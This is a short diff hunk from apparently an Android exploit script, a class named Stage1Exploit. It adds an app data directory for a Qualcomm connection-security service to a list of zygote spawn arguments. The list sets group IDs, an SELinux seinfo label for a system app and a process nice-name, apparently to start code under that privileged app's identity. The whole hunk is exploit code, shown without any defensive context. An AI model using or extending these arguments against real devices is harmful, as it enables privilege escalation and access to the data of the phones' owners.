@@ -191,6 +191,7 @@ class Stage1Exploit:
             "--setgid=3003",
             "--setgroups=3003",
             "--runtime-args",
+            "--app-data-dir=/data/user/0/com.qualcomm.qti.qms.service.connectionsecurity",
             "--seinfo=ssgapp:ssg_app:targetSdkVersion=28:complete",
             "--runtime-flags=1",
             "--nice-name=ssgapp",
